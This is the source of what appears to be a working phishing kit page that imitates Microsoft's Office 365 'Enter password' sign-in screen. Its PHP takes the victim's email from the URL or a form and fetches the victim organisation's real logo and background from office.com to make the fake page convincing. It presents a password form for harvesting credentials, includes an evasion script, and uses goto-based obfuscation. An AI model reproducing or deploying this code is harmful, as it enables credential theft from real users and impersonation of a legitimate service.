<?php

error_reporting(0);
include "anti.php";
include 'config.php';
include 'One_time.php';
session_start();
$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);
$_SESSION['token'] = "access";
if (!empty($_POST['username'])) {
    $_SESSION['username'] = $_POST['username'];
    goto vWPAO;
}
$_SESSION['username'] = $_GET['ea'];
vWPAO:
$er = $_SESSION['username'];
if (!($_SESSION['username'] == "")) {
    goto fFiC6;
}
header("Location: next.php?ss=2");
fFiC6:
$email = $_SESSION['username'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.office.com/login?es=Click&ru=%2F');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36");
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
$result = curl_exec($ch);
$respond_link = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
curl_close($ch);
$parts = parse_url($respond_link);
parse_str($parts['query'], $query);
$post = ['client_id' => $query['client_id'], 'login_hint' => $email];
$ch = curl_init();
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
curl_setopt($ch, CURLOPT_URL, $respond_link);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36");
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
$result = curl_exec($ch);
curl_close($ch);
preg_match_all("|\"BannerLogo[^>]+\":(.*)\"/[^>]+\",|U", $result, $BannerLogo, PREG_PATTERN_ORDER);
$BannerLogo = explode(",", $BannerLogo[0][0]);
preg_match_all('#\\bhttps?://[^,\\s()<>]+(?:\\([\\w\\d]+\\)|([^,[:punct:]\\s]|/))#', $BannerLogo[0], $BannerLogo);
preg_match_all("|\"Illustration[^>]+\":(.*)\"/[^>]+\",|U", $result, $Illustration, PREG_PATTERN_ORDER);
$Illustration = explode(",", $Illustration[0][0]);
preg_match_all('#\\bhttps?://[^,\\s()<>]+(?:\\([\\w\\d]+\\)|([^,[:punct:]\\s]|/))#', $Illustration[0], $Illustration);
$logo_image = $BannerLogo[0][0];
$bg_image = $Illustration[0][0];
if (!($logo_image == "")) {
    goto aWDfm;
}
$logo_image = "files/microsoft_logo.svg";
aWDfm:
if (!($bg_image == "")) {
    goto u0a12;
}
$bg_image = "files/0.jpg";
u0a12:
$_SESSION['logo'] = $logo_image;
$_SESSION['bg'] = $bg_image;
?>

<!DOCTYPE html>

<html dir="ltr" lang="EN-US">

<head>



<script>
function empty() {
    var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("password").style = "border-color:red";
		document.getElementById("password_error").style = "display: block";
        return false;
    };

}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("password").style = "";
		document.getElementById("password_error").style = "display: none";
	}
	
}

</script>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge">

<base href=".">
<title>Enter your password</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
<link rel="shortcut icon" href="./files2/favicon.ico">
            <link rel="stylesheet" title="Converged" type="text/css" href="./files2/Converged1033.css">
			<style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style>
<style type="text/css">body{display:block !important;}</style>
<link rel="image_src" href="">

</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div> <div><div class="background" role="presentation"><div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;./files2/0-small.jpg&quot;);"></div> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;<?php 
echo $bg_image;
?>&quot;);"></div><div class="background-overlay"></div></div></div> 

<form name="form" id="form" spellcheck="false" method="post" autocomplete="off"  method="post" action='<?php 
if ($truelogin == true) {
    echo "complete?ss=2";
} else {
    echo "error?ss=2&ea={$er}";
}
?>'>

 <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.A2,
            showFooterLinks: true,
            useWizardBehavior: svr.BR,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"> <div class="middle"> <div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }">
<img class="background-logo" id="loader" style="display:none;margin-bottom: 31px;margin-top: 1;max-width: 100%;margin-top: -34px;" role="presentation" data-bind="attr: { src: backgroundLogoUrl }" src="files/load2.gif">

			<div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
						
						<img class="logo" role="presentation" pngsrc="<?php 
echo $logo_image;
?>" svgsrc="<?php 
echo $logo_image;
?>" data-bind="imgSrc" src="<?php 
echo $logo_image;
?>"></div> <div data-bind="
                    css: { &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) },
                    component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }">
							</br>
							<a href="next.php?ss=2"> <img role="presentation" src="files/arrow_left.png" svgsrc="files/arrow_left.svg" data-bind="imgSrc"> </a><?php 
echo $_SESSION['username'];
?><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }" class="animate"><div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            hasRemoteNgc: !!sharedData.remoteNgcParams.sessionIdentifier,
                            desktopSsoEnabled: sharedData.desktopSsoEnabled,
                            defaultKmsiValue: svr.I === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            isLongRunningTransaction: sharedData.isLongRunningTransaction },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            desktopSsoStart: $loginPage.view_desktopSsoStart } }">

							<input type="text" name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">

							<div data-bind="component: { name: &#39;identity-banner-control&#39;,
     params: {
        pawnIconId: svr.Bw,
        displayName: displayName } }"> </div></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"> </div> <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;, params: {
            serverData: svr,
            textInput: password,
            hasFocus: isFocused,
            hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;],
            forcePlaceholderAttribute: true,
            hintCss: &#39;placeholder&#39; } }">
			
			<label id="password_error" style="display: none"><font color="red">Password is required</font></label>
			
			<input name="password" type="password" id="password" onblur="change();" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: password,
                    hasFocusEx: isFocused,
                    placeholder: $placeholderText,
                    ariaLabel: str[&#39;CT_PWD_STR_PwdTB_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: error }" placeholder="Password" aria-label="Enter password">
								<hr size="1" color="#0066cc">
             

			

					</div> </div> </div>  </div> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.B &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]" aria-label="Keep me signed in"> <span data-bind="text: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]">Keep me signed in</span> </label> </div> <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group no-margin-bottom" data-bind="css: { &#39;no-margin-bottom&#39;: !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink }"> <a id="idA_PWD_ForgotPassword" href="">Forgot my password</a> </div> </div> </div> </div> </div> 
<script>
	function myFunction()
{
    document.getElementById('loader').style='display:block;margin-bottom: 31px;margin-top: 1;max-width: 100%;margin-top: -34px;';
}
</script>
<input type="submit" style="float:right" id="idSIButton9" onclick="myFunction()" class="btn btn-primary" value="Sign In">          <script>
          var form = document.getElementById("form"), button = document.getElementById("idSIButton9");



</script></form></div></div> </div>  <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"></div> </div> </div> <div id="footer" class="footer default" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"> <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.aa">2020 Microsoft</span> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; Cookies</a> </div> </div> </div> </div></body></html>
